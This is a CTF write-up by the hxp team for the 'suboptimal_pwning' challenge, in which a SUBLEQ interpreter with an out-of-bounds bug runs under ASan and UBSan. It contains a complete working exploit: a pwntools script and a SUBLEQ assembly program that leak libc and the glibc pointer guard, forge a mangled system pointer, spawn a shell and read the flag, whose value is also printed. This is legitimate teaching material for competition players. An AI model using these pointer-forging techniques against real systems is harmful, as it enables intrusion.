---
title: "suboptimal_pwning - hxp 38C3 CTF"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "buffer-overflow", "one-gadget", "aslr", "lsb", "proof-of-work", "subprocess", "stack", "hxp-38c3-ctf", "ctf-writeup"]
summary: "Thu, 02 January 2025 ~ sandr0 and sisu"
source:
  name: "CTFtime writeup #39758"
  url: "https://ctftime.org/writeup/39758"
original_source: "https://hxp.io/blog/118/"
ctf:
  name: "hxp 38C3 CTF"
  challenge: "suboptimal_pwning"
---

## Metadata

- **CTF:** hxp 38C3 CTF
- **Task:** suboptimal_pwning
- **Author team:** hxp
- **CTFtime:** <https://ctftime.org/writeup/39758>
- **Original writeup:** <https://hxp.io/blog/118/>

---
Thu, 02 January 2025 ~ sandr0 and sisu

## hxp 38C3 CTF: suboptimal_pwning

PWN (667 points, 6 solves)

This post discusses the solution for the [suboptimal_pwning](https://2024.ctf.link/internal/challenge/c5eb95e9-bf33-4e54-856b-f118023ad9e0/) challenge.

### Challenge overview

The challenge offers a remote service where one can provide their SUBLEQ program to be emulated using the interpreter from [[1](https://github.com/davidar/subleq/blob/master/src/sq.orig.c)]. The interpreter has an obvious buffer overflow during program input and program emulation for accesses to the buffer _mem_. The goal of the challenge is to submit a SUBLEQ program that obtains the flag from the filesystem.

SUBLEQ [[3](https://esolangs.org/wiki/Subleq)] is a popular single-instruction abstract instruction set [[2](https://en.wikipedia.org/wiki/One-instruction_set_computer)] that has a single instruction that handles subtraction of values in memory, handles jumps to new memory addresses, and handles input and output for a given memory address. For more details on the SUBLEQ instruction set, [[3](https://esolangs.org/wiki/Subleq)] gives a good overview.

Normally, the exploit for this challenge would be fairly simple since the _mem_ buffer is allocated on the stack and there’s an arbitrary read and write to stack memory. The typical exploit would be to obtain a libc pointer from stack memory and modify its value to a one-gadget [[4](https://github.com/david942j/one_gadget)], that would then give a remote shell on _ret_.

The challenge is made more difficult by enabling a plethora of clang compiler hardenings for the binary, that can be seen in the provided Dockerfile.build. I suggest searching the compiler flags on the internet for more details. The more impactful compiler flags are _fsanitize=address_ (AddressSanitizer) and _fsanitize=integer_ (UBSan subset) that add runtime compiler checks for memory accesses and integer arithmetic for the built binary [[5](https://www.youtube.com/watch?v=V2_80g0eOMc)] [[9](https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html)]. ASAn instruments the binary program to catch near out-of-bounds accesses to the _mem_ buffer by surrounding the buffer with _red zones_ and using reference _shadow memory_ to determine if the access is allowed. The instrumentation also has the _mem_ buffer to be allocated via ___asan_stack_malloc_10_ that results in the buffer be allocated in mmap-region instead of the stack. The UBSan-integer checks catch signed integer wrap-arounds and other unintended or undefined behavior [[9](https://clang.llvm.org/docs/UndefinedBehaviorSanitizer.html)], that also made the exploit more unstable.

### How to exploit?

Since the _mem_ buffer is in the mmap region and there’s no explicit randomization for mappings in the mmap region, except for the mmap region base, the relative offsets between _mem_ and _libc_ can be hardcoded. Note that there may still be noise in the relative offset value due to the behavior of the address space allocator, but the noise is still relatively small (8 bits?). For testing with ASLR disabled, the relative offset of 23531488 touches exactly the base of the libc image when run in the docker container.

Since there is noise in the relative offset value, the exploit would very often fail. To address this, the exploit collects data about the address space and applies a correction to the hardcoded relative offset. First, the SUBLEQ program dumps the first byte of each 4-byte-word starting at the supposed libc base, and then solve.py searches for this pattern in the known libc image. Once the pattern is found, the true relative offset is calculated and sent to the SUBLEQ program from the solve.py script. The absolute libc base address can be obtained by leaking any pointers in libc.

The final step is to corrupt data in libc that will allow spawning a shell, but this requires defeating glibc’s Pointer Encryption [[6](https://sourceware.org/glibc/wiki/PointerEncryption)]. Function pointers in glibc are protected using Pointer Encryption [[6](https://sourceware.org/glibc/wiki/PointerEncryption)] that prevents simply overwriting a glibc pointer with a pointer to a desired function (e.g. system). The code for encrypting a pointer - _PTR_MANGLE(var)_ \- is shown in [[7](https://elixir.bootlin.com/glibc/glibc-2.40.9000/source/sysdeps/unix/sysv/linux/x86_64/pointer_guard.h#L48)], that xors the pointer value with the random value POINTER_GUARD (located at $fs+0x30) and then applies a fixed rotation to the pointer using _rol_. Since the thread local storage (pointed by $fs) is also located in the mmap region, the SUBLEQ program also obtains the pointer guard value that can then be used for forging pointers usable by libc.

Conveniently, the pointer guard also simplifies finding a suitable pointer to overwrite - just set a read watchpoint on the pointer guard and let the program exit. The read watchpoint will be hit when libc tries to decrypt any pointer in libc before calling it, thus giving away a good pointer to overwrite from the SUBLEQ program.

For coding the SUBLEQ exploit, the sblasm [[8](https://github.com/lawrencewoodman/sblasm)] project is used. The project is a SUBLEQ macro assembler that implements convenient macros for memory copies, division, addition and multiplication.

Flag: `hxp{1_1nstruct1on_much_pa1n_st111_1nsecure_111e1ns}`

### Exploit code

solve.py:

```
    #!/usr/bin/env python3
    
    from pwn import *
    
    io = None
    
    # Get the static data for the exploit
    with open("./libc_new.so.6", "rb") as f:
        libc_blob = f.read()
    
    with open("./solve.sq", "rb") as f:
        sq_blob = f.read()
    
    def do_pow(s):
        import re, subprocess, time
        m = re.search(r'please give S such that sha256\(unhex\("([0-9a-f]+)" \+ S\)\) ends with ([0-9]+) zero bits', s)
        if m is None:
            raise Exception("Failed to parse pow", f)
        prefix = m.groups()[0]
        difficulty = int(m.groups()[1])
        print(f'[starting PoW... difficulty=\x1b[35m{difficulty}\x1b[0m prefix=\x1b[35m{prefix}\x1b[0m]', file=sys.stderr)
        t0 = time.time()
        sol = subprocess.check_output(['./pow-solver', str(difficulty), prefix]).decode().strip()
        print('[PoW took \x1b[35m{}\x1b[0m seconds ~> \x1b[35m{}\x1b[0m.]'.format(time.time() - t0, sol), file=sys.stderr)
        return sol
    
    def rol(v, off):
        # Necessary for mangling the pointer
        return ((v << off) | (v >> (64 - off))) & ((1 << 64) - 1)
    
    def fix_ptr_offsets(off):
        # No need to send all 4 bytes since the libc binary is ~2MiB
        # and the correction cannot be more than log2(2MiB) that is a
        # bit below 24 bits
        tmp = (off & 0xff0000) >> 16
        io.send(bytes([tmp]))
    
        tmp = (off & 0xff00) >> 8
        io.send(bytes([tmp]))
    
        tmp = off & 0xff
        io.send(bytes([tmp]))
    
    def hack():
        global io
        if io:
            io.close()
            io = None
    
        io = remote(sys.argv[1], int(sys.argv[2]))
    
        # Do pow
        r = io.readline().decode()
        info(f"POW: {r}")
        sol = do_pow(r)
        info(f"Solution: {sol}")
        io.sendline(sol.encode())
    
        # Send the program
        io.readuntil(b"Please give your subleq program: ")
        io.send(sq_blob)
    
        io.readline()
    
        # Read now the leaked bytes
        # The leaks are the first byte for each 4-byte-long value.
        # The code then checks if the pattern exists in libc and
        # then finds the necessary adjustment to be made to any
        # code that does relative access from the mmap-ed fake stack
        # to libc / fs.
        #
        # The harcoded offset in the sq program is from the libc_base
        # if ASLR is disabled
        n = 256
        leaked_vars = b""
        for _ in range(n):
            leaked_vars += io.recv(1)
        io.recv(1) # \n
    
        found_off = None
        for u in range(0, len(libc_blob) - 4 * n, 4):
            ok = all(libc_blob[u + v * 4] == leaked_vars[v] for v in range(0, n))
            if ok:
                found_off = u
                break
    
        assert found_off != None
    
        info(f"Need to correct by {found_off // 4}")
    
        # to get this offset, you need to modify the subleq program to cause a crash
        # you can do this, by doing this:
        #   sble IN inp
        #   sble 5882872 OUT
        #
        # Then add an interactive shell after sending the program (somewhere above in the code)
        # Then attach with gdb and send '1' from the interactive shell.
        # The compute the offset (remember to divide by 4)
        libc_offset = 5882872 - found_off // 4
        info(f"libc_offset: {hex(libc_offset)}")
    
        # Send the correction offset to the sq program
        fix_ptr_offsets(found_off // 4)
    
        # Get the full ptr guard
        ptr_guard = b""
        while len(ptr_guard) != 8:
            b = io.read(1)
            if b != b"":
                ptr_guard += b
        ptr_guard = int.from_bytes(ptr_guard, 'little')
        info(f"ptr_guard          {hex(ptr_guard)}")
    
        # Get the libc base
        libc_base = b""
        while len(libc_base) != 8:
            b = io.read(1)
            if b != b"":
                libc_base += b
        libc_base = int.from_bytes(libc_base, 'little')
        libc = libc_base
        info(f"libc               {hex(libc)}")
    
        # Use system instead of one_gadget since it's more reliable
        system = libc + 0x58740
        info(f"system             {hex(system)}")
    
        # The demangling code in libc is:
        #   ptr = ror(ptr, 0x11)
        #   ptr ^= ptr_guard
        # The below code just reverses the operation
        mangled_system = rol(system ^ ptr_guard, 0x11)
        info(f"mangled system {hex(mangled_system)}")
    
        # Send the mangled system ptr that the sq program
        # will then take and overwrite the function ptr with.
        # The ptr is sent from MSB to LSB since that simplified
        # the code for reading and calculating the 32-bit values.
        for i in range(8):
            # print("Write Mangled one_gadget")
            tmp = (mangled_system >> ((7 - i) * 8)) & 0xff
            # print("0x000000XX", hex(tmp))
            io.send(bytes([tmp]))
    
        # Send the /bin/sh ptr
        binshptr = libc + 0x1cb42f
        for i in range(8):
            # print("Write Mangled one_gadget")
            tmp = (binshptr >> ((7 - i) * 8)) & 0xff
            # print("0x000000XX", hex(tmp))
            io.send(bytes([tmp]))
    
        # A lot of things can go wrong in the steps above and the
        # program may have died or about to die.
        # There are various reasons for the failure, but they are
        # not well understood:
        # - there are ocassional int overflows that UBSAN catches
        # - the leaked pointers may have an off-by-1 for some bytes
        #   so the exploit will just fail (jump to invalid address)
        # - there was some kind of weird race locally between
        #   sanitizer catching a crash and terminating the program
        #   and the clone() call.
        io.sendline(b"id")
        rcv = io.readline(timeout=10)
        info(rcv.decode())
        if b"AddressSanitizer" in rcv or b"overflow" in rcv or b"=================================================\n" in rcv or b"DEADLYSIGNAL" in rcv:
             raise Exception("Failed")
        io.sendline(b"cat ./flag.txt")
        flag = io.readuntil(b"}").decode()
        print(f"Flag: {flag}")
    
    # Usually takes ~60 tries
    num_tries = 256
    for i in range(num_tries):
        try:
            info(f"Attempt: {i+1}/{num_tries}")
            hack()
            exit(1)
        except Exception as e:
            info(f"fail: {str(e)}")
```

solve.asq:

```
    .include    "sblasm/arch_linux.inc.asq"
    .include    "sblasm/standard.asq"
    .include    "sblasm/io.asq"
    
    
    ;========================================
    ;           Start
    ;========================================
        sble  z z main
    
    ; macro to print a 4 byte value
    ; for some reason, the printed bytes may be off-by-one
    scratch: .word 0
    .macro sisu_print value
        ; print byte0
        sble tmp tmp
        copy value tmp
        sble tmp OUT
    
        ; divide by 256 ^ 1 and print byte1
        div #256 tmp
        sble tmp OUT
    
        ; divide by 256 ^ 2 and print byte1
        div #256 tmp
        sble tmp OUT
    
        ; divide by 256 ^ 3 and print byte1
        div #256 tmp
        sble tmp OUT
    
    .endm
    
    ;========================================
    ;           Main
    ;========================================
    main:
    
        ; Keeping this here because the solve.py expects it
        io::newline
    
    
        ; Dump 256 bytes to help the solve.py determine the libc offset correction
        ; Shortcut for generating in the future:
        ;     python3 -c 'print("\n".join([f"sble {5882872 + i} OUT" for i in range(256)]))'
    
        sble 5882872 OUT
        sble 5882873 OUT
        sble 5882874 OUT
        sble 5882875 OUT
        sble 5882876 OUT
        sble 5882877 OUT
        sble 5882878 OUT
        sble 5882879 OUT
        sble 5882880 OUT
        sble 5882881 OUT
        sble 5882882 OUT
        sble 5882883 OUT
        sble 5882884 OUT
        sble 5882885 OUT
        sble 5882886 OUT
        sble 5882887 OUT
        sble 5882888 OUT
        sble 5882889 OUT
        sble 5882890 OUT
        sble 5882891 OUT
        sble 5882892 OUT
        sble 5882893 OUT
        sble 5882894 OUT
        sble 5882895 OUT
        sble 5882896 OUT
        sble 5882897 OUT
        sble 5882898 OUT
        sble 5882899 OUT
        sble 5882900 OUT
        sble 5882901 OUT
        sble 5882902 OUT
        sble 5882903 OUT
        sble 5882904 OUT
        sble 5882905 OUT
        sble 5882906 OUT
        sble 5882907 OUT
        sble 5882908 OUT
        sble 5882909 OUT
        sble 5882910 OUT
        sble 5882911 OUT
        sble 5882912 OUT
        sble 5882913 OUT
        sble 5882914 OUT
        sble 5882915 OUT
        sble 5882916 OUT
        sble 5882917 OUT
        sble 5882918 OUT
        sble 5882919 OUT
        sble 5882920 OUT
        sble 5882921 OUT
        sble 5882922 OUT
        sble 5882923 OUT
        sble 5882924 OUT
        sble 5882925 OUT
        sble 5882926 OUT
        sble 5882927 OUT
        sble 5882928 OUT
        sble 5882929 OUT
        sble 5882930 OUT
        sble 5882931 OUT
        sble 5882932 OUT
        sble 5882933 OUT
        sble 5882934 OUT
        sble 5882935 OUT
        sble 5882936 OUT
        sble 5882937 OUT
        sble 5882938 OUT
        sble 5882939 OUT
        sble 5882940 OUT
        sble 5882941 OUT
        sble 5882942 OUT
        sble 5882943 OUT
        sble 5882944 OUT
        sble 5882945 OUT
        sble 5882946 OUT
        sble 5882947 OUT
        sble 5882948 OUT
        sble 5882949 OUT
        sble 5882950 OUT
        sble 5882951 OUT
        sble 5882952 OUT
        sble 5882953 OUT
        sble 5882954 OUT
        sble 5882955 OUT
        sble 5882956 OUT
        sble 5882957 OUT
        sble 5882958 OUT
        sble 5882959 OUT
        sble 5882960 OUT
        sble 5882961 OUT
        sble 5882962 OUT
        sble 5882963 OUT
        sble 5882964 OUT
        sble 5882965 OUT
        sble 5882966 OUT
        sble 5882967 OUT
        sble 5882968 OUT
        sble 5882969 OUT
        sble 5882970 OUT
        sble 5882971 OUT
        sble 5882972 OUT
        sble 5882973 OUT
        sble 5882974 OUT
        sble 5882975 OUT
        sble 5882976 OUT
        sble 5882977 OUT
        sble 5882978 OUT
        sble 5882979 OUT
        sble 5882980 OUT
        sble 5882981 OUT
        sble 5882982 OUT
        sble 5882983 OUT
        sble 5882984 OUT
        sble 5882985 OUT
        sble 5882986 OUT
        sble 5882987 OUT
        sble 5882988 OUT
        sble 5882989 OUT
        sble 5882990 OUT
        sble 5882991 OUT
        sble 5882992 OUT
        sble 5882993 OUT
        sble 5882994 OUT
        sble 5882995 OUT
        sble 5882996 OUT
        sble 5882997 OUT
        sble 5882998 OUT
        sble 5882999 OUT
        sble 5883000 OUT
        sble 5883001 OUT
        sble 5883002 OUT
        sble 5883003 OUT
        sble 5883004 OUT
        sble 5883005 OUT
        sble 5883006 OUT
        sble 5883007 OUT
        sble 5883008 OUT
        sble 5883009 OUT
        sble 5883010 OUT
        sble 5883011 OUT
        sble 5883012 OUT
        sble 5883013 OUT
        sble 5883014 OUT
        sble 5883015 OUT
        sble 5883016 OUT
        sble 5883017 OUT
        sble 5883018 OUT
        sble 5883019 OUT
        sble 5883020 OUT
        sble 5883021 OUT
        sble 5883022 OUT
        sble 5883023 OUT
        sble 5883024 OUT
        sble 5883025 OUT
        sble 5883026 OUT
        sble 5883027 OUT
        sble 5883028 OUT
        sble 5883029 OUT
        sble 5883030 OUT
        sble 5883031 OUT
        sble 5883032 OUT
        sble 5883033 OUT
        sble 5883034 OUT
        sble 5883035 OUT
        sble 5883036 OUT
        sble 5883037 OUT
        sble 5883038 OUT
        sble 5883039 OUT
        sble 5883040 OUT
        sble 5883041 OUT
        sble 5883042 OUT
        sble 5883043 OUT
        sble 5883044 OUT
        sble 5883045 OUT
        sble 5883046 OUT
        sble 5883047 OUT
        sble 5883048 OUT
        sble 5883049 OUT
        sble 5883050 OUT
        sble 5883051 OUT
        sble 5883052 OUT
        sble 5883053 OUT
        sble 5883054 OUT
        sble 5883055 OUT
        sble 5883056 OUT
        sble 5883057 OUT
        sble 5883058 OUT
        sble 5883059 OUT
        sble 5883060 OUT
        sble 5883061 OUT
        sble 5883062 OUT
        sble 5883063 OUT
        sble 5883064 OUT
        sble 5883065 OUT
        sble 5883066 OUT
        sble 5883067 OUT
        sble 5883068 OUT
        sble 5883069 OUT
        sble 5883070 OUT
        sble 5883071 OUT
        sble 5883072 OUT
        sble 5883073 OUT
        sble 5883074 OUT
        sble 5883075 OUT
        sble 5883076 OUT
        sble 5883077 OUT
        sble 5883078 OUT
        sble 5883079 OUT
        sble 5883080 OUT
        sble 5883081 OUT
        sble 5883082 OUT
        sble 5883083 OUT
        sble 5883084 OUT
        sble 5883085 OUT
        sble 5883086 OUT
        sble 5883087 OUT
        sble 5883088 OUT
        sble 5883089 OUT
        sble 5883090 OUT
        sble 5883091 OUT
        sble 5883092 OUT
        sble 5883093 OUT
        sble 5883094 OUT
        sble 5883095 OUT
        sble 5883096 OUT
        sble 5883097 OUT
        sble 5883098 OUT
        sble 5883099 OUT
        sble 5883100 OUT
        sble 5883101 OUT
        sble 5883102 OUT
        sble 5883103 OUT
        sble 5883104 OUT
        sble 5883105 OUT
        sble 5883106 OUT
        sble 5883107 OUT
        sble 5883108 OUT
        sble 5883109 OUT
        sble 5883110 OUT
        sble 5883111 OUT
        sble 5883112 OUT
        sble 5883113 OUT
        sble 5883114 OUT
        sble 5883115 OUT
        sble 5883116 OUT
        sble 5883117 OUT
        sble 5883118 OUT
        sble 5883119 OUT
        sble 5883120 OUT
        sble 5883121 OUT
        sble 5883122 OUT
        sble 5883123 OUT
        sble 5883124 OUT
        sble 5883125 OUT
        sble 5883126 OUT
        sble 5883127 OUT
    
    
        io::newline
    
    
        ; Read the correction one-byte-at-a-time and then accummulate into the correction memory address
        sble inp inp
        sble IN inp
        std::Mulu #16 inp
        std::Mulu #16 inp
        std::Mulu #16 inp
        std::Mulu #16 inp
        add inp correction
    
        sble inp inp
        sble IN inp
        std::Mulu #16 inp
        std::Mulu #16 inp
        add inp correction
    
        sble inp inp
        sble IN inp
        add inp correction
    
        ; this is here for debugging purposes because then the value
        ; can be always dumped from memory address 0 via gdb - no need to know where the 'correction' variable lives.
        copy correction 0
    
        ; apply the correction to the offset for the mangled pointer offsset in fsbase
        ; dump least 4 bytes
        copy #5878244 scratch
        sble correction scratch
        copy scratch 2
        copy #1 1
        copy_pp 2 1
        copy 1 scratch
        sisu_print scratch
    
        ; apply the correction to the offset for the mangled pointer offsset in fsbase
        ; dump top 4 bytes
        copy #5878245 scratch
        sble correction scratch
        copy scratch 2
        copy #1 1
        copy_pp 2 1
        copy 1 scratch
        sisu_print scratch
    
        ; same procedure but for the address containing a pointer to the libc_base
        copy #5878920 scratch
        sble correction scratch
        copy scratch 2
        copy #1 1
        copy_pp 2 1
        copy 1 scratch
        sisu_print scratch
    
        copy #5878921 scratch
        sble correction scratch
        copy scratch 2
        copy #1 1
        copy_pp 2 1
        copy 1 scratch
        sisu_print scratch
    
        ; apply correction to the offset for the first corrutable pointer during program teardown.
        ; to find this address, one can set a read watchpoint to the mangled mask address and then
        ; wait for the first access - this works since the pointer is used only for unmasking pointers
        ; that can be corrupted.
        sble scratch scratch
        copy #6412302 scratch
        sble correction scratch
    
        ; read the system mangled pointer - first top 4 bytes, then lower 4 bytes
        ; win_1 contains top bytes, win_0 lower bytes
        sble inp inp
        sble IN inp
        std::Mulu #256 inp
        std::Mulu #256 inp
        std::Mulu #256 inp
        add inp win_1
    
        sble inp inp
        sble IN inp
        std::Mulu #256 inp
        std::Mulu #256 inp
        add inp win_1
    
        sble inp inp
        sble IN inp
        std::Mulu #256 inp
        add inp win_1
    
        sble inp inp
        sble IN inp
        add inp win_1
    
        sble inp inp
        sble IN inp
        std::Mulu #256 inp
        std::Mulu #256 inp
        std::Mulu #256 inp
        add inp win_0
    
        sble inp inp
        sble IN inp
        std::Mulu #256 inp
        std::Mulu #256 inp
        add inp win_0
    
        sble inp inp
        sble IN inp
        std::Mulu #256 inp
        add inp win_0
    
        sble inp inp
        sble IN inp
        add inp win_0
    
        ; overwrite the libc function ptr
        copy scratch 2
        copy win_0 0
        copy #0 1
        copy_pp 1 2
    
        add #1 scratch
        copy scratch 2
        copy win_1 0
        copy #0 1
        copy_pp 1 2
    
        ; read the /bin/sh pointer and write it after the libc function pointer since
        ; that's where the argument is read from before calling the function pointer.
        sble inp inp
        sble IN inp
        std::Mulu #256 inp
        std::Mulu #256 inp
        std::Mulu #256 inp
        add inp s1
    
        sble inp inp
        sble IN inp
        std::Mulu #256 inp
        std::Mulu #256 inp
        add inp s1
    
        sble inp inp
        sble IN inp
        std::Mulu #256 inp
        add inp s1
    
        sble inp inp
        sble IN inp
        add inp s1
    
        sble inp inp
        sble IN inp
        std::Mulu #256 inp
        std::Mulu #256 inp
        std::Mulu #256 inp
        add inp s0
    
        sble inp inp
        sble IN inp
        std::Mulu #256 inp
        std::Mulu #256 inp
        add inp s0
    
        sble inp inp
        sble IN inp
        std::Mulu #256 inp
        add inp s0
    
        sble inp inp
        sble IN inp
        add inp s0
    
        add #1 scratch
        copy scratch 2
        copy s0 0
        copy #0 1
        copy_pp 1 2
    
        add #1 scratch
        copy scratch 2
        copy s1 0
        copy #0 1
        copy_pp 1 2
    
        ; if some debugging is necessary, the below line can be uncommented and then
        ; one can attach with gdb to the process and set a breapoint to the code
        ; that will call into the function pointer
        ; sble IN tmp
    done:
    
        ; halt to trigger the exploit
        sble  z z HALT
    
    ;========================================
    ;           Data Storage
    ;========================================
    tmp:        .word 0
    correction: .word 0
    inp:        .word 0
    win_0:      .word 0
    win_1:      .word 0
    s0:         .word 0
    s1:         .word 0
```
